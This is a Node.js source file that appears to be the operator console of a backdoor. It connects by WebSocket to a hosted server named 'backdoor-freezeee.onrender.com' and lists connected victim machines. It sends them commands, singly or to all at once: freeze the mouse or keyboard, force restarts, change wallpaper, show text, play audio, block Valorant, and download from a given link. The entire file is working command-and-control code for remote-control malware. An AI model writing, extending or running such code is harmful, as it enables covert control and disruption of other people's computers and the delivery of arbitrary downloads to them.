const WebSocket = require("ws"); // CJS Only for packing (pkg)
const readline = require("readline");

const ws = new WebSocket("wss://backdoor-freezeee.onrender.com");
// const ws = new WebSocket("ws://localhost:8602");

const optionsTable = `M - Freeze Mouse         K - Freeze Keyboard\nUM - Unfreeze Mouse      UK - Unfreeze Keyboard\nI - Image                CW - Change Wallpaper\nC - Calculator           FR - Force Restart\nSF - Safe Restart        AU - Audio\nDW - Download something  BV - Block Valorant\nUV - Unblock Valorant   CUI - COOK PC UI!!\nBYE - Turns off a client\nT_(word)_secs - Puts a word on screen\n\nLC - List Clients\n\nIf want to send to all clients, then type: 'a|(command)|opc arg1)'`;

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

const commandsMap = {
  "M": "FREEZE_MOUSE",
  "K": "FREEZE_KEYBOARD",
  "UM": "UNFREEZE_MOUSE",
  "UK": "UNFREEZE_KEYBOARD",
  "I": "IMAGE",
  "C": "CALCULATOR",
  "CUI": "COOK_PC_UI",
  "AU": "AUDIO",
  "CW": "CHANGE_WALLPAPER",
  "T_": "TEXT_",
  "DW": "DOWNLOAD",
  "FR": "FORCE_RESTART",
  "SF": "SAFE_RESTART",
  "BV": "BLOCK_VALORANT",
  "UV": "UNBLOCK_VALORANT",
  "BMKG": "BLOCK_MKG",
  "UMKG": "UNBLOCK_MKG",
  "BYE": "BYE",
  spcArgs: { "A": "ALL" }
};

function connect() {
  ws.on("open", () => {
    console.log("-------------------------- ADM CLIENT --------------------------\n")
    console.log("Connected to server\n");
    ws.send("ADM");

    console.log("DO NOT PUT '_' NOR '|' ON T_... PLEASE!\n")
    console.log(optionsTable);

    rl.on("line", (input) => {
      const command = input.trim()

      if (command.toLowerCase() === "lc") {
        ws.send("LIST_CLIENTS");
        console.log("\nRequested client list");
        return;
      }

      const sep = '|';

      if (!command.includes(sep)) {
        console.log("Bad Syntax!");

        return;
      }

      // {SPECIAL}|COMMAND|{opt.. Arg1}
      const target = command.split(sep)[0];
      const key = command.split(sep)[1].toUpperCase();
      const arg1 = command.split(sep)[2]

      let sendString = "";

      if (!commandsMap[key] && !key.startsWith("T_")) {
        console.log("Bad Command");

        return;
      }

      if (commandsMap.spcArgs[target.toUpperCase()])
        sendString += commandsMap.spcArgs[target.toUpperCase()];
      else
        sendString += target.toLowerCase();
      sendString += "|" + (key.startsWith("T_") ? "TEXT_" : commandsMap[key]);

      if (key.startsWith("T_")) {
        const secs = key.split("_")[2];
        sendString += key.split("_")[1].trim()

        if (/^\d+$/.test(secs))
          sendString += ("_" + secs);
      }
      else if (arg1) sendString += "|" + arg1;

      if (key === "DW" && !arg1)
      {
        console.log("Missing link for download.");
        return;
      }

      sendString = sendString.trim();
      console.log("Sent:", sendString);
      ws.send(sendString);
    });
  });

  ws.on("message", (data) => {
    console.log("Server sent:", data.toString(), "\n");
  });

  ws.on("close", () => {
    console.log("Connection closed");

    return;
  });

  ws.on("error", (err) => {
    console.error("Erro:", err.message);

    return;
  });
}

connect();
